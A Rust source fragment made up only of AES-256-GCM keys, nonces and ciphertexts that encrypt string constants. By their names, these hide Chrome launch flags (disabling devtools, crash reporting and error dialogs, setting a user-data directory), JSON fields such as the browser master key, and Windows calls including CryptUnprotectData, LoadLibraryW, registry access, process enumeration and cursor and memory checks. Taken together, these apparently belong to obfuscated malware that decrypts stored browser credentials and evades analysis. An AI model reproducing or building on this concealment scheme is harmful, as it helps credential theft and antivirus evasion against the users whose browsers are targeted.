pub static CHROME_FLAG_NOERR_KEY: [u8; 32] = [0x88, 0x2D, 0xCE, 0xE5, 0x20, 0xA8, 0x8C, 0x7D, 0xEF, 0xAE, 0x87, 0x46, 0x24, 0xF0, 0xF8, 0xA1, 0xFF, 0xA9, 0xE0, 0x37, 0xDD, 0xC6, 0x36, 0xB9, 0x33, 0x1D, 0x48, 0x24, 0xCD, 0x91, 0x9F, 0xFA];
pub static CHROME_FLAG_NOERR_NONCE: [u8; 12] = [0x41, 0xDB, 0xDA, 0xA8, 0x96, 0x67, 0xA7, 0xFC, 0xE9, 0x3E, 0x77, 0x20];
pub static CHROME_FLAG_NOERR_ENC: &[u8] = &[0x8F, 0xEC, 0x39, 0x00, 0xE6, 0xDC, 0x6D, 0x89, 0x85, 0xBA, 0x37, 0xBA, 0xA7, 0xCA, 0x23, 0x18, 0x90, 0xF6, 0xDB, 0xF0, 0x14, 0x28, 0x08, 0x43, 0x2D, 0xE6, 0x57, 0x05, 0x85, 0xC1];
pub static CHROME_FLAG_NODEVTOOLS_KEY: [u8; 32] = [0x2D, 0x18, 0xF3, 0xF8, 0x28, 0xF1, 0x17, 0xEA, 0x5C, 0xDA, 0x5B, 0x9A, 0x7D, 0x6B, 0xC1, 0xB9, 0x88, 0x63, 0x79, 0xD1, 0x8A, 0xB2, 0x9F, 0x7C, 0x9B, 0xA6, 0xF6, 0x0B, 0x0C, 0xB7, 0x47, 0x0F];
pub static CHROME_FLAG_NODEVTOOLS_NONCE: [u8; 12] = [0x6A, 0xFB, 0x41, 0x7F, 0x2E, 0x74, 0x27, 0xF7, 0xFE, 0x36, 0x67, 0x91];
pub static CHROME_FLAG_NODEVTOOLS_ENC: &[u8] = &[0xEF, 0x07, 0x74, 0xFE, 0x85, 0x5A, 0xE7, 0x95, 0x93, 0x58, 0x42, 0xB8, 0xD6, 0x92, 0x65, 0x6D, 0x3C, 0x3C, 0xA2, 0x1D, 0x82, 0x45, 0x4F, 0x19, 0x36, 0xA9, 0x51, 0x6D, 0x1C, 0xCE, 0x17, 0x25, 0xCA, 0xB3, 0x0B];
pub static CHROME_FLAG_NOTRANSLATE_KEY: [u8; 32] = [0x44, 0x1F, 0xF1, 0x2D, 0xAF, 0x56, 0x4C, 0xA6, 0x64, 0x69, 0x97, 0x14, 0x5F, 0xE6, 0x28, 0xCA, 0xB3, 0xDA, 0xE3, 0xE1, 0xC3, 0x90, 0x96, 0x59, 0x88, 0x00, 0x9F, 0x53, 0xB5, 0x48, 0x45, 0x21];
pub static CHROME_FLAG_NOTRANSLATE_NONCE: [u8; 12] = [0x03, 0x27, 0xC1, 0xA4, 0x5B, 0x05, 0xA2, 0x3A, 0x5D, 0x6C, 0x2C, 0x23];
pub static CHROME_FLAG_NOTRANSLATE_ENC: &[u8] = &[0x6C, 0x3E, 0x49, 0x69, 0x29, 0x96, 0x7A, 0x2E, 0xA9, 0xDA, 0x7B, 0xA2, 0x8A, 0x82, 0xD3, 0xB7, 0x88, 0x22, 0x6A, 0x16, 0xC9, 0x68, 0x07, 0x6F, 0x66, 0x88, 0x69, 0x0C, 0x80, 0x5D, 0xC2, 0x5E, 0x77, 0x08, 0x31, 0xD9, 0x33, 0xE5, 0xCE, 0x7C, 0x75, 0x8B, 0xFA, 0xDE];
pub static CHROME_FLAG_NOFLOOD_KEY: [u8; 32] = [0x0C, 0x4E, 0x47, 0xBD, 0x01, 0xBB, 0x04, 0x4C, 0x8F, 0xA2, 0xC2, 0x4D, 0x79, 0xA4, 0x81, 0x9A, 0x30, 0x68, 0x23, 0x94, 0x92, 0xA1, 0x23, 0x13, 0x4D, 0x8A, 0xCD, 0x19, 0xA4, 0x05, 0xC7, 0x3A];
pub static CHROME_FLAG_NOFLOOD_NONCE: [u8; 12] = [0x1A, 0xAC, 0xD6, 0x4B, 0x70, 0xE8, 0xE5, 0xC8, 0x97, 0x0D, 0x0E, 0xFD];
pub static CHROME_FLAG_NOFLOOD_ENC: &[u8] = &[0xB4, 0xD1, 0xE4, 0xD6, 0xD6, 0xE9, 0xC1, 0xB9, 0xF0, 0x90, 0xF3, 0x97, 0x21, 0xCC, 0x86, 0xC0, 0x84, 0xB5, 0xEE, 0xCF, 0xB3, 0x22, 0x06, 0xEF, 0xB7, 0x86, 0xF8, 0x93, 0xDF, 0x94, 0x63, 0x1E, 0x31, 0x56, 0x68, 0x77, 0x36, 0xC0, 0x83, 0x3E, 0x4F, 0x36, 0xCC, 0xF0, 0x2E, 0x2F, 0x6F, 0x7D, 0x99];
pub static CHROME_FLAG_NOBREAKPAD_KEY: [u8; 32] = [0x09, 0xC2, 0xED, 0x6C, 0xF5, 0xD1, 0xD1, 0x31, 0x3C, 0x39, 0x53, 0x5A, 0x9A, 0x94, 0xEA, 0xC1, 0xF0, 0x63, 0x3C, 0x47, 0x5D, 0xD9, 0x2B, 0x94, 0x09, 0x71, 0xDD, 0x87, 0xC9, 0xD2, 0x9B, 0xB5];
pub static CHROME_FLAG_NOBREAKPAD_NONCE: [u8; 12] = [0x98, 0x25, 0x86, 0xCC, 0x9A, 0xA6, 0x5D, 0x91, 0xB9, 0x3F, 0xDD, 0x2F];
pub static CHROME_FLAG_NOBREAKPAD_ENC: &[u8] = &[0xCA, 0x52, 0xC2, 0x6D, 0xCF, 0x87, 0x2E, 0xF9, 0xAE, 0x3E, 0x55, 0x08, 0x19, 0x8F, 0x3F, 0xD4, 0x9A, 0x52, 0x02, 0xEE, 0xF0, 0x76, 0x42, 0x8C, 0xFB, 0x70, 0xA1, 0x78, 0xA8, 0xD0, 0xE0, 0x4B, 0x9F, 0xF7];
pub static CHROME_FLAG_METRICS_KEY: [u8; 32] = [0x9A, 0xA9, 0x6E, 0x11, 0xFC, 0x08, 0xE8, 0xCC, 0x33, 0xD3, 0x5D, 0x1D, 0x15, 0xD8, 0x04, 0x42, 0xB4, 0xFC, 0xD8, 0x1E, 0xC1, 0x51, 0x1A, 0xD2, 0x72, 0x3E, 0xB7, 0x37, 0xF8, 0x1B, 0x27, 0x63];
pub static CHROME_FLAG_METRICS_NONCE: [u8; 12] = [0x80, 0x82, 0x82, 0x62, 0x96, 0xBC, 0x15, 0x1C, 0xBF, 0x0F, 0xAF, 0x8B];
pub static CHROME_FLAG_METRICS_ENC: &[u8] = &[0x90, 0xFF, 0x0B, 0x83, 0x24, 0x06, 0x55, 0xA5, 0xA9, 0x0F, 0x8E, 0xF4, 0x89, 0xC3, 0xC4, 0xA7, 0xB3, 0xE9, 0xAE, 0x63, 0xDB, 0x5E, 0xB8, 0xF8, 0xEB, 0x0F, 0xDA, 0xD1, 0x66, 0x92, 0xF3, 0xB2, 0x2F, 0xF7, 0x9E, 0x87, 0x1B, 0xBA, 0x30, 0xF0];
pub static CHROME_FLAG_USERDATA_KEY: [u8; 32] = [0x35, 0x7B, 0xCC, 0x08, 0x76, 0x52, 0xB1, 0x29, 0xDF, 0x32, 0xCE, 0xEF, 0x63, 0x52, 0xB0, 0x6F, 0xDF, 0xCA, 0x4D, 0xC2, 0x52, 0x81, 0x70, 0x9F, 0x30, 0x52, 0xCA, 0xFC, 0x9B, 0xC8, 0xA5, 0x94];
pub static CHROME_FLAG_USERDATA_NONCE: [u8; 12] = [0x0B, 0xCD, 0x98, 0x40, 0xED, 0x8B, 0xC0, 0x1C, 0x9D, 0x5F, 0x07, 0xBE];
pub static CHROME_FLAG_USERDATA_ENC: &[u8] = &[0xD6, 0x1E, 0x16, 0x01, 0xB6, 0xE7, 0x7F, 0x1A, 0xF5, 0x22, 0x51, 0x19, 0xBD, 0xCD, 0x75, 0x9C, 0xD5, 0xE8, 0x9E, 0x9B, 0xB3, 0x36, 0x73, 0xE8, 0xDF, 0x77, 0xAB, 0x08, 0x41, 0x27, 0x96, 0x70];
pub static JSON_KEY_MASTER_KEY: [u8; 32] = [0xA8, 0x31, 0x30, 0x40, 0xB8, 0x29, 0x53, 0x1E, 0x72, 0x91, 0x26, 0x34, 0x25, 0x9D, 0xAC, 0xE9, 0x91, 0x54, 0x20, 0x01, 0x96, 0x14, 0xDC, 0xC6, 0x11, 0x00, 0xF2, 0x3A, 0x36, 0x33, 0x48, 0xD6];
pub static JSON_KEY_MASTER_NONCE: [u8; 12] = [0xF7, 0x73, 0xFD, 0xAD, 0x54, 0xF3, 0x35, 0xB3, 0xF8, 0x78, 0x28, 0x5F];
pub static JSON_KEY_MASTER_ENC: &[u8] = &[0xED, 0x76, 0xED, 0xE3, 0xE4, 0x37, 0x77, 0x5B, 0x07, 0x45, 0x36, 0xEA, 0xDA, 0x5F, 0x6D, 0x68, 0x97, 0x71, 0xFF, 0x1B, 0xB2, 0xC6, 0xAC, 0x16, 0xA7, 0x78, 0xA3, 0x40, 0xA7, 0xB2];
pub static JSON_KEY_ERROR_KEY: [u8; 32] = [0xE8, 0xA8, 0x20, 0x42, 0x67, 0x54, 0xF2, 0x09, 0xC0, 0x7E, 0x86, 0x25, 0x0A, 0xA0, 0xCB, 0xC7, 0x3A, 0x60, 0xDF, 0xC3, 0x7B, 0xB5, 0x2A, 0x23, 0x1F, 0x47, 0xA0, 0xA8, 0xA8, 0xC6, 0xE6, 0x3C];
pub static JSON_KEY_ERROR_NONCE: [u8; 12] = [0x6A, 0xC0, 0xDE, 0xD9, 0x5C, 0x27, 0xE4, 0xEB, 0xF1, 0xBD, 0x55, 0x3F];
pub static JSON_KEY_ERROR_ENC: &[u8] = &[0x98, 0xAE, 0x29, 0x77, 0xA1, 0x04, 0x39, 0x35, 0xCA, 0xD7, 0x0D, 0x9A, 0xB6, 0x8A, 0x53, 0x5F, 0x9B, 0x7C, 0x78, 0xA2, 0x2A];
pub static JSON_KEY_BROWSER_KEY: [u8; 32] = [0x2E, 0xD1, 0x3A, 0xD6, 0xB7, 0xB8, 0xBC, 0x60, 0xCF, 0xF8, 0x75, 0x5F, 0xAF, 0x7A, 0x7F, 0xA2, 0xE5, 0xD7, 0x0B, 0xF8, 0x74, 0xA4, 0x34, 0x14, 0xD4, 0x48, 0xE4, 0x5F, 0xE6, 0x09, 0xFE, 0x7D];
pub static JSON_KEY_BROWSER_NONCE: [u8; 12] = [0x47, 0x6E, 0xC3, 0xF3, 0x59, 0x54, 0x4F, 0x4D, 0x80, 0xEB, 0x04, 0xB3];
pub static JSON_KEY_BROWSER_ENC: &[u8] = &[0xA3, 0x9D, 0x0E, 0x4B, 0xCD, 0x4E, 0xB7, 0x50, 0xCB, 0x3E, 0x71, 0xE0, 0x86, 0xF0, 0x9E, 0x5B, 0xE1, 0x36, 0x3B, 0x48, 0xB1, 0xE3, 0x6B];

// ===== elev.rs strings =====

// ===== api.rs AES-256-GCM string constants =====
pub static CRYPTUNPROTECTDATA_ENC_KEY: [u8; 32] = [0xF6, 0x98, 0xD6, 0x61, 0x23, 0x2F, 0xD1, 0xEB, 0xF5, 0x47, 0x19, 0xDE, 0xE4, 0x94, 0xA7, 0xDF, 0x30, 0x67, 0xE6, 0x04, 0x4D, 0x6C, 0x08, 0x1B, 0xFF, 0x72, 0x2A, 0x61, 0x28, 0xC8, 0x43, 0x33];
pub static CRYPTUNPROTECTDATA_ENC_NONCE: [u8; 12] = [0x63, 0xA1, 0xC4, 0xE5, 0x95, 0xA3, 0xB5, 0x57, 0xEB, 0x35, 0x1C, 0x2E];
pub static CRYPTUNPROTECTDATA_ENC_CT: &[u8] = &[0xC2, 0x35, 0x56, 0x51, 0x39, 0xAD, 0x08, 0x55, 0x82, 0x8D, 0x56, 0x96, 0x3C, 0x52, 0xF6, 0xD4, 0xC1, 0x49, 0x4F, 0x57, 0x3A, 0x7A, 0x93, 0x15, 0x01, 0xD2, 0x79, 0x5C, 0x49, 0xB1, 0xC6, 0x56, 0x53, 0x9F];
pub static LOCALFREE_ENC_KEY: [u8; 32] = [0xED, 0xCA, 0xB0, 0x41, 0x40, 0x93, 0xC2, 0xA8, 0x55, 0xDF, 0x98, 0xFE, 0x39, 0xE2, 0x43, 0xD4, 0x76, 0x08, 0x55, 0x33, 0x90, 0xCE, 0x71, 0x0D, 0xC7, 0xF7, 0x26, 0x3E, 0x79, 0x43, 0xC3, 0xAA];
pub static LOCALFREE_ENC_NONCE: [u8; 12] = [0x38, 0x13, 0x80, 0xE4, 0x2C, 0x8C, 0xF5, 0x9D, 0x4C, 0x3F, 0xD0, 0x76];
pub static LOCALFREE_ENC_CT: &[u8] = &[0xCA, 0x05, 0x0E, 0x30, 0xC4, 0xE5, 0xF0, 0xB1, 0x2F, 0xD5, 0xD0, 0xE6, 0x3F, 0x2D, 0x42, 0x51, 0xE2, 0xBB, 0x4A, 0x88, 0xCB, 0x02, 0x33, 0x70, 0xDE];
pub static GETTICKCOUNT64_ENC_KEY: [u8; 32] = [0x22, 0xCC, 0x57, 0xEA, 0xFF, 0x22, 0xF4, 0x92, 0xD1, 0x0E, 0x16, 0xD9, 0x8E, 0xAF, 0xDA, 0x8C, 0x07, 0xEB, 0xB0, 0xD8, 0x94, 0x36, 0xF2, 0x92, 0x38, 0x2A, 0xB8, 0x05, 0x7C, 0x53, 0x9C, 0x7B];
pub static GETTICKCOUNT64_ENC_NONCE: [u8; 12] = [0xD5, 0x3B, 0x2D, 0x88, 0xDC, 0x10, 0xE5, 0x43, 0x19, 0xC5, 0x1B, 0xFD];
pub static GETTICKCOUNT64_ENC_CT: &[u8] = &[0x0C, 0xEC, 0xCC, 0x5C, 0xA9, 0x3A, 0x35, 0x68, 0x59, 0xB3, 0x45, 0xD4, 0x2A, 0xE5, 0x65, 0x3B, 0x7C, 0x52, 0xB9, 0x02, 0x86, 0x8C, 0xB2, 0x0D, 0xB8, 0x52, 0xB6, 0x8C, 0x4C, 0xA9];
pub static GETSYSTEMINFO_ENC_KEY: [u8; 32] = [0x29, 0x97, 0xF7, 0xC1, 0x0A, 0xFE, 0x4C, 0x96, 0xE5, 0x4C, 0x7B, 0x92, 0xCE, 0xDD, 0x7F, 0x66, 0x8C, 0xBF, 0x62, 0x5E, 0x57, 0x42, 0xE1, 0x9E, 0xB0, 0xEA, 0x79, 0x2C, 0x9C, 0xF3, 0xC3, 0xF2];
pub static GETSYSTEMINFO_ENC_NONCE: [u8; 12] = [0x26, 0x64, 0x97, 0x68, 0xBE, 0x5D, 0x23, 0xE6, 0x2E, 0xA7, 0x6C, 0x95];
pub static GETSYSTEMINFO_ENC_CT: &[u8] = &[0xD7, 0x72, 0x8E, 0x6A, 0x3A, 0x3A, 0x48, 0xBD, 0x72, 0x58, 0x7E, 0xF2, 0xBF, 0x62, 0xBC, 0xCF, 0x38, 0xD7, 0xE4, 0xED, 0x4E, 0x8A, 0x7C, 0xC0, 0xA0, 0xBE, 0xA9, 0x91, 0x91];
pub static GLOBALMEMORYSTATUSEX_ENC_KEY: [u8; 32] = [0xAD, 0x23, 0x1E, 0x05, 0xA5, 0x46, 0x92, 0xB7, 0xA7, 0x78, 0xF8, 0x1A, 0xCC, 0x94, 0xF0, 0xA0, 0xC0, 0xEA, 0xF4, 0xB3, 0x1D, 0xEE, 0xD8, 0x7F, 0xFA, 0x85, 0x3F, 0xA7, 0x21, 0x12, 0xDA, 0x38];
pub static GLOBALMEMORYSTATUSEX_ENC_NONCE: [u8; 12] = [0x0C, 0x4F, 0x1F, 0x2F, 0xAE, 0xDD, 0x03, 0x79, 0xE0, 0x5E, 0xC6, 0xB3];
pub static GLOBALMEMORYSTATUSEX_ENC_CT: &[u8] = &[0x7E, 0x14, 0x9D, 0x32, 0x5C, 0xE7, 0xCD, 0x1B, 0x28, 0x97, 0xBC, 0xF8, 0xEC, 0x52, 0x68, 0xA5, 0xB5, 0x15, 0x7C, 0xBC, 0x80, 0x94, 0x6C, 0xCA, 0xBF, 0x80, 0x06, 0x27, 0x17, 0xEA, 0x4A, 0x98, 0x07, 0x58, 0xD8, 0x07];
pub static LOADLIBRARYW_ENC_KEY: [u8; 32] = [0x5B, 0xD9, 0x81, 0xBB, 0xFA, 0x9F, 0x30, 0x8F, 0x54, 0x2B, 0x77, 0x34, 0xCE, 0x2E, 0x1E, 0xAE, 0x3F, 0x13, 0x48, 0xE0, 0x06, 0x3B, 0xDC, 0x46, 0x1D, 0xC4, 0x63, 0x61, 0x7A, 0x9E, 0xA0, 0x47];
pub static LOADLIBRARYW_ENC_NONCE: [u8; 12] = [0xBF, 0xA3, 0xC3, 0x2B, 0x0F, 0x39, 0x90, 0x22, 0x7A, 0x00, 0x64, 0x0F];
pub static LOADLIBRARYW_ENC_CT: &[u8] = &[0xD5, 0xAB, 0x76, 0x07, 0xDB, 0x86, 0x13, 0xEB, 0x5D, 0xC6, 0x79, 0x17, 0x51, 0x59, 0x2C, 0x9A, 0xFE, 0xA4, 0x74, 0x17, 0x38, 0x7B, 0x94, 0x3B, 0x3E, 0x71, 0xF8, 0x22];
pub static MESSAGEBOXW_ENC_KEY: [u8; 32] = [0x7B, 0x36, 0x2A, 0xCB, 0xCE, 0x1A, 0xD8, 0xAF, 0x06, 0xB4, 0x6E, 0xEE, 0x52, 0xCD, 0xB4, 0xDC, 0x6D, 0xC5, 0x09, 0x8C, 0x06, 0x64, 0x28, 0x02, 0x9A, 0xCA, 0xE8, 0x2C, 0x09, 0xCE, 0xF9, 0x7E];
pub static MESSAGEBOXW_ENC_NONCE: [u8; 12] = [0x68, 0x10, 0xA0, 0x30, 0x10, 0xD8, 0x55, 0x61, 0xB9, 0xCE, 0xC0, 0x2F];
pub static MESSAGEBOXW_ENC_CT: &[u8] = &[0x9A, 0xE4, 0x3B, 0x4F, 0x4C, 0xAF, 0x21, 0x1D, 0xB6, 0xC9, 0x8E, 0x37, 0xB2, 0x01, 0x45, 0x76, 0x04, 0x1B, 0x96, 0x16, 0x9D, 0x2C, 0x46, 0x8E, 0xC4, 0xEA, 0x73];
pub static GETSYSTEMMETRICS_ENC_KEY: [u8; 32] = [0xB8, 0x63, 0x63, 0xB8, 0xDA, 0xFF, 0x39, 0x86, 0x5A, 0x99, 0x97, 0xE6, 0x13, 0xD4, 0x8B, 0x19, 0x1F, 0x1E, 0x4E, 0xA5, 0x90, 0x84, 0x64, 0xC0, 0x25, 0x51, 0xA9, 0xD7, 0xC8, 0xD6, 0x07, 0xE2];
pub static GETSYSTEMMETRICS_ENC_NONCE: [u8; 12] = [0xC0, 0xBF, 0x41, 0x84, 0xBC, 0x4F, 0x79, 0x7A, 0x31, 0x04, 0x46, 0x7A];
pub static GETSYSTEMMETRICS_ENC_CT: &[u8] = &[0xE8, 0xA6, 0xFA, 0x18, 0x64, 0x89, 0x62, 0xC9, 0x8E, 0x00, 0x5A, 0xB7, 0x28, 0x6F, 0x9A, 0x27, 0x70, 0x69, 0x62, 0xFF, 0x32, 0x4C, 0xED, 0x6C, 0xF5, 0xDE, 0xBF, 0x27, 0x36, 0x3F, 0xFE, 0x48];
pub static CRYPT32_DLL_ENC_KEY: [u8; 32] = [0x63, 0x97, 0xE6, 0xDB, 0xBA, 0x11, 0x94, 0x1A, 0x9F, 0xFC, 0x71, 0x9B, 0x90, 0x24, 0xA7, 0x0F, 0x51, 0x79, 0x98, 0xE7, 0x6B, 0xFE, 0xAA, 0x27, 0xF7, 0xEA, 0x78, 0x9D, 0x4D, 0x81, 0xD8, 0xFF];
pub static CRYPT32_DLL_ENC_NONCE: [u8; 12] = [0xF7, 0x09, 0x09, 0xA2, 0xEC, 0xA4, 0x50, 0xCC, 0xF0, 0x03, 0xAD, 0x91];
pub static CRYPT32_DLL_ENC_CT: &[u8] = &[0xBD, 0xA4, 0xC6, 0xD5, 0x25, 0x42, 0x22, 0x06, 0xAA, 0x40, 0x33, 0x0D, 0xCE, 0x70, 0x9A, 0xE9, 0x98, 0x2E, 0xC9, 0xBB, 0xC8, 0x2B, 0x8C, 0xBC, 0xFD, 0x38, 0x56];
pub static KERNEL32_DLL_ENC_KEY: [u8; 32] = [0xEC, 0x33, 0xD8, 0xF4, 0xAC, 0xB0, 0x7F, 0x24, 0x6C, 0x86, 0x46, 0xF8, 0xB0, 0x0D, 0x29, 0x58, 0xC3, 0xAC, 0x23, 0xBC, 0x16, 0xED, 0x49, 0xFB, 0xA4, 0x2D, 0xCD, 0x22, 0xE9, 0xE8, 0xCC, 0x2D];
pub static KERNEL32_DLL_ENC_NONCE: [u8; 12] = [0xAD, 0x61, 0xEF, 0x6D, 0xA7, 0x25, 0x76, 0x9C, 0xF7, 0xA0, 0x24, 0xC3];
pub static KERNEL32_DLL_ENC_CT: &[u8] = &[0x5E, 0xD5, 0xBB, 0x76, 0xB6, 0x8A, 0x17, 0x3A, 0x78, 0xB0, 0x48, 0x9B, 0xA7, 0x07, 0xD6, 0xA8, 0x1E, 0x35, 0x3D, 0xD6, 0xA5, 0x42, 0xE8, 0xAB, 0x91, 0xF9, 0xDA, 0xB2];
pub static USER32_DLL_ENC_KEY: [u8; 32] = [0x9B, 0x6E, 0x3C, 0xD0, 0x4A, 0x22, 0xD0, 0x96, 0x2E, 0x6C, 0x94, 0xA4, 0xEF, 0x7E, 0x7B, 0x84, 0x66, 0x28, 0xD0, 0xBD, 0x24, 0x3A, 0x8A, 0x1E, 0xC0, 0xB4, 0x17, 0x54, 0x5C, 0x6A, 0x4F, 0x31];
pub static USER32_DLL_ENC_NONCE: [u8; 12] = [0xD8, 0x2B, 0xE8, 0x1C, 0x80, 0xA9, 0x3C, 0xFE, 0xB1, 0xB9, 0xBB, 0x90];
pub static USER32_DLL_ENC_CT: &[u8] = &[0xC6, 0x16, 0xD9, 0x08, 0xED, 0xD1, 0x00, 0xDE, 0xF4, 0xAC, 0x2A, 0x8D, 0x76, 0x2B, 0x5F, 0xB2, 0x5E, 0xD7, 0xCF, 0x4F, 0x91, 0x39, 0x18, 0x6A, 0xBD, 0x06];
pub static ADVAPI32_DLL_ENC_KEY: [u8; 32] = [0xCB, 0xD9, 0xA3, 0x7F, 0x18, 0x01, 0x5A, 0xF1, 0x27, 0xD4, 0xAA, 0x75, 0xDD, 0xB7, 0xAD, 0x96, 0x1E, 0x31, 0x81, 0xCD, 0x7F, 0x53, 0x49, 0x56, 0xCA, 0xF2, 0x20, 0x7F, 0x6F, 0x77, 0x35, 0x12];
pub static ADVAPI32_DLL_ENC_NONCE: [u8; 12] = [0x19, 0x7B, 0x0C, 0xD5, 0x7C, 0xA1, 0x2C, 0xC0, 0x25, 0xF8, 0x4F, 0xCD];
pub static ADVAPI32_DLL_ENC_CT: &[u8] = &[0x2D, 0x1A, 0xEE, 0xD6, 0x88, 0x4D, 0x4E, 0xDC, 0xC1, 0x9C, 0xB9, 0x7E, 0x51, 0xCA, 0x01, 0x57, 0x7A, 0x59, 0xD0, 0xDD, 0x15, 0x41, 0x44, 0x26, 0x31, 0x71, 0x2E, 0xA7];
pub static REGOPENKEYEXW_ENC_KEY: [u8; 32] = [0xD7, 0x14, 0x77, 0x1C, 0x3C, 0x5A, 0x79, 0xB7, 0xE4, 0xD3, 0xFE, 0x36, 0x1D, 0xB8, 0x0C, 0x7C, 0x31, 0x6F, 0x22, 0xBB, 0x65, 0xEB, 0x68, 0xE8, 0x8C, 0xC3, 0x09, 0x8E, 0xBC, 0xA1, 0xEA, 0x51];
pub static REGOPENKEYEXW_ENC_NONCE: [u8; 12] = [0x89, 0xA9, 0xD6, 0xD5, 0xFE, 0xAB, 0x34, 0x97, 0xC0, 0xB0, 0xBB, 0xC6];
pub static REGOPENKEYEXW_ENC_CT: &[u8] = &[0x05, 0x9F, 0xB2, 0x6E, 0x3B, 0xC3, 0xDF, 0x1F, 0x6C, 0x3F, 0x07, 0x40, 0x12, 0x62, 0xD9, 0x58, 0x5A, 0x8B, 0x3F, 0xC2, 0xBF, 0xF0, 0xD7, 0xE0, 0x9F, 0x53, 0x86, 0xA9, 0x99];
pub static REGCLOSEKEY_ENC_KEY: [u8; 32] = [0x2A, 0x1A, 0x9A, 0x25, 0xE5, 0x90, 0xC7, 0x25, 0xBD, 0x76, 0xCA, 0x28, 0xE0, 0xA1, 0x2F, 0x6A, 0x3E, 0xCF, 0x70, 0x8D, 0xE1, 0x2E, 0xE7, 0x18, 0x7C, 0xBC, 0x0F, 0x95, 0x2D, 0xB1, 0x0E, 0x8A];
pub static REGCLOSEKEY_ENC_NONCE: [u8; 12] = [0x2D, 0xCE, 0x82, 0x3E, 0x15, 0xCB, 0x5C, 0x89, 0xF4, 0xA5, 0xFE, 0xD9];
pub static REGCLOSEKEY_ENC_CT: &[u8] = &[0x74, 0x63, 0x0B, 0xB0, 0x15, 0xB5, 0xAF, 0x05, 0x65, 0x9A, 0xFF, 0x00, 0xC0, 0xF7, 0xE9, 0xB3, 0xC9, 0x8B, 0x1D, 0x67, 0x0E, 0x22, 0xC2, 0xB0, 0xF4, 0x11, 0x1C];
pub static GETCURSORPOS_ENC_KEY: [u8; 32] = [0xA2, 0xEC, 0x7D, 0xCB, 0xEE, 0xD0, 0x34, 0x42, 0xB9, 0xE9, 0x89, 0x1F, 0xD2, 0x21, 0x76, 0xF8, 0x2D, 0x1E, 0xD7, 0x18, 0x97, 0x39, 0x69, 0x59, 0x3C, 0x67, 0x61, 0xD5, 0xB1, 0x10, 0xD7, 0x9E];
pub static GETCURSORPOS_ENC_NONCE: [u8; 12] = [0x9F, 0x8D, 0xA1, 0x00, 0x27, 0x47, 0x92, 0x6A, 0x1A, 0x41, 0xB6, 0xE7];
pub static GETCURSORPOS_ENC_CT: &[u8] = &[0x2A, 0x41, 0x17, 0xE4, 0x7F, 0x2D, 0x93, 0x34, 0xEC, 0x85, 0x32, 0xEC, 0xB4, 0x73, 0x5D, 0x1E, 0xE7, 0x23, 0xBA, 0x1B, 0x88, 0xEF, 0x40, 0x47, 0xC5, 0x12, 0xF7, 0xA0];
pub static GETFOREGROUNDWINDOW_ENC_KEY: [u8; 32] = [0x91, 0xD7, 0xBE, 0x07, 0x1B, 0x74, 0x5F, 0x52, 0xCA, 0xE0, 0x60, 0x2F, 0x43, 0xF8, 0x0D, 0x05, 0xD5, 0x2B, 0xC0, 0x1C, 0x54, 0xA3, 0x71, 0x90, 0xB8, 0x08, 0xF1, 0x39, 0x30, 0xE8, 0x29, 0xA2];
pub static GETFOREGROUNDWINDOW_ENC_NONCE: [u8; 12] = [0xA0, 0x3C, 0x37, 0xEC, 0x28, 0xA4, 0x93, 0xBB, 0xB7, 0x9F, 0x9F, 0xAF];
pub static GETFOREGROUNDWINDOW_ENC_CT: &[u8] = &[0x65, 0x5D, 0x1D, 0xBB, 0x70, 0xB0, 0x6B, 0x7C, 0xB4, 0xAA, 0xDA, 0x2A, 0x9C, 0x2A, 0x11, 0x75, 0x61, 0x70, 0xB2, 0x18, 0x8C, 0x13, 0x8F, 0x38, 0xE0, 0x2F, 0x78, 0x24, 0x3A, 0x21, 0x1D, 0x84, 0x5B, 0xC2, 0x3C];
pub static ENUMDISPLAYDEVICESW_ENC_KEY: [u8; 32] = [0xB0, 0xDB, 0x12, 0x87, 0x72, 0xD9, 0x75, 0x1F, 0x7B, 0xFE, 0x7D, 0x22, 0xDE, 0x2A, 0xEE, 0xD8, 0x70, 0x16, 0x4C, 0xA1, 0x8B, 0x74, 0xD7, 0x89, 0x22, 0x45, 0x17, 0xEE, 0x34, 0x45, 0xD6, 0xF5];
pub static ENUMDISPLAYDEVICESW_ENC_NONCE: [u8; 12] = [0xA5, 0x6E, 0xD6, 0x17, 0xEE, 0xE5, 0x45, 0xF6, 0xD3, 0x0B, 0x77, 0xA4];
pub static ENUMDISPLAYDEVICESW_ENC_CT: &[u8] = &[0xB8, 0xF5, 0xE8, 0x56, 0x19, 0x53, 0x8C, 0xB8, 0x88, 0xBD, 0x91, 0x57, 0x1D, 0xF5, 0xF0, 0xA7, 0xC0, 0x6F, 0xAC, 0x23, 0x5E, 0xE3, 0x9D, 0x1A, 0xA0, 0x3E, 0xB5, 0x92, 0xBB, 0xF2, 0xA1, 0x92, 0xD5, 0x99, 0xBB];
pub static CREATETOOLHELP32SNAPSHOT_ENC_KEY: [u8; 32] = [0x82, 0x4C, 0x7E, 0x0D, 0xF4, 0xF5, 0x2C, 0x1B, 0x58, 0x9B, 0x80, 0x6E, 0xA3, 0xEE, 0xA6, 0xC2, 0x04, 0x79, 0x46, 0xAA, 0xB6, 0xF7, 0x67, 0x4E, 0x44, 0x8F, 0x22, 0xB4, 0x73, 0x24, 0xDF, 0x18];
pub static CREATETOOLHELP32SNAPSHOT_ENC_NONCE: [u8; 12] = [0x02, 0x19, 0xA3, 0xFD, 0xD3, 0x58, 0xC5, 0xED, 0x94, 0xE2, 0x7C, 0xA9];
pub static CREATETOOLHELP32SNAPSHOT_ENC_CT: &[u8] = &[0xB5, 0xEC, 0xCB, 0x08, 0x78, 0x3D, 0x46, 0x64, 0x0B, 0x11, 0xD4, 0x36, 0x34, 0x31, 0xBC, 0x3D, 0x82, 0x8F, 0x8D, 0xB8, 0x50, 0x15, 0x55, 0x84, 0x42, 0x01, 0xA0, 0xFC, 0x67, 0xCD, 0x4C, 0x06, 0xDE, 0x3C, 0x39, 0xE6, 0xEB, 0xD6, 0xCC, 0x6A];
pub static PROCESS32FIRSTW_ENC_KEY: [u8; 32] = [0xC6, 0xB1, 0x37, 0x25, 0x2F, 0xB2, 0x75, 0xF5, 0x5A, 0x8C, 0x03, 0x05, 0x11, 0x89, 0xA6, 0x0B, 0xF5, 0xA2, 0x98, 0x52, 0x44, 0xAC, 0x07, 0x05, 0x14, 0xA6, 0xE8, 0x92, 0xEE, 0x03, 0x95, 0x34];
pub static PROCESS32FIRSTW_ENC_NONCE: [u8; 12] = [0xCD, 0x6B, 0x5A, 0x63, 0xD4, 0x07, 0x77, 0x3B, 0xD6, 0xB3, 0xEA, 0xCB];
